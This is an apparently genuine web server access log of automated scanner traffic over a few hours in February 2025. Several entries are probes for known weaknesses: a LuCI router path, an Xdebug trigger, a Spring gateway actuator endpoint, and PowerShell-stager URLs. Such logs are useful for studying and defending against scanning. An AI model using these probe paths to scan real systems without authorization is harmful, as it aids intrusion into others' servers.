205.210.31.83 - - [16/Feb/2025:20:59:54 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xFA\xB1J\x8B\x00\xE9\xE0<\xE8!\xAC\x0BX\xD4BSn\x94lX\xBD;1kZ9\xEEP\x80\x02\x13  \xE4\xC5~~\xF5\xCCXA\xCB$\x81]P\xDA\xDE\xECP{\x9Aig\xF4\x9F\xF3\x98\x09|\x16$E\xB3\xF5\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-"
141.255.166.90 - - [16/Feb/2025:21:03:28 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
46.19.143.58 - - [16/Feb/2025:21:03:55 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.51 - - [16/Feb/2025:21:08:49 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
198.235.24.105 - - [16/Feb/2025:21:15:51 +0000] "GET / HTTP/1.0" 200 135 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
92.246.87.21 - - [16/Feb/2025:21:43:27 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.255.166.90 - - [16/Feb/2025:21:53:04 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
92.255.57.58 - - [16/Feb/2025:21:55:14 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.255.57.58 - - [16/Feb/2025:22:14:26 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.148.10.90 - - [16/Feb/2025:22:18:04 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x86E3b\x8A\xB9Ns<\xCA>AA\x11h\x8D\x9C^\x99lN\xC0mo\x859\x8A>\xDE\xB3o~ \x94\x10\xF3\xD4\xA4>?\xE5\x08\x11O\x0F4F'\x22\x0E\x1A\xD9\xB3:,\x89 /)\x1C_'XG\x8C\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-"
45.148.10.90 - - [16/Feb/2025:22:18:05 +0000] "GET / HTTP/1.1" 400 157 "-" "-"
45.148.10.90 - - [16/Feb/2025:22:18:05 +0000] "GET / HTTP/1.1" 200 146 "-" "l9tcpid/v1.1.0"
167.71.67.169 - - [16/Feb/2025:22:37:43 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03F\x17\x9D\x95\xCE\x9FE\xBFd\x09\xF52\xB5\xE2\x0C\x9A\xF7\x15\xEEr\x8C\xCA\xC7\xE6\xCC\x8ERn\xAC0\xFC\xD8\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
167.71.67.169 - - [16/Feb/2025:22:37:43 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x88\xA4\xFFP\x80L3\xE2SvS\x8C\xE3\xAF^y\x93\xB2\xC8\xA4.\xCBKO\xF3\x89~V\xEC\xF57\x98\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
167.71.67.169 - - [16/Feb/2025:22:37:43 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.71.67.169 - - [16/Feb/2025:22:37:43 +0000] "GET /download/powershell/ HTTP/1.1" 404 125 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
167.71.67.169 - - [16/Feb/2025:22:37:43 +0000] "GET /get.php HTTP/1.1" 404 125 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
141.255.166.90 - - [16/Feb/2025:22:40:15 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
46.19.143.58 - - [16/Feb/2025:22:59:31 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.51 - - [16/Feb/2025:22:59:41 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
172.206.148.204 - - [16/Feb/2025:23:00:28 +0000] "MGLNDD_193.93.76.135_8080" 400 157 "-" "-"
92.246.87.21 - - [16/Feb/2025:23:11:55 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.10 - - [16/Feb/2025:23:17:26 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
109.205.213.198 - - [16/Feb/2025:23:26:08 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.255.166.90 - - [16/Feb/2025:23:29:36 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
193.68.89.51 - - [16/Feb/2025:23:44:35 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
191.36.147.103 - - [17/Feb/2025:00:11:31 +0000] "GET / HTTP/1.1" 200 146 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
141.255.166.90 - - [17/Feb/2025:00:18:38 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
92.246.87.21 - - [17/Feb/2025:00:38:11 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.51 - - [17/Feb/2025:00:43:33 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
46.19.143.58 - - [17/Feb/2025:00:50:14 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
195.178.110.163 - - [17/Feb/2025:01:01:59 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xC9h.\x85n]^$\xCE;\xFE\xB0\x09\xC2A\x9CzM\xBA\xD8\x95\xD5\xD5\x01\x09;\xF7\x03Z\xA3\xB4; \x8CA\xD1y,\xAF\xB2\x97\xC9i\x06\xA5\xBE\xC59\x01\xC8\x19\xDD\x08\x981[\x91\xCE\xCB\xCA~\x81\x07\xAB\xBF\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-"
195.178.110.163 - - [17/Feb/2025:01:01:59 +0000] "GET / HTTP/1.1" 400 157 "-" "-"
195.178.110.163 - - [17/Feb/2025:01:01:59 +0000] "GET / HTTP/1.1" 200 146 "-" "l9tcpid/v1.1.0"
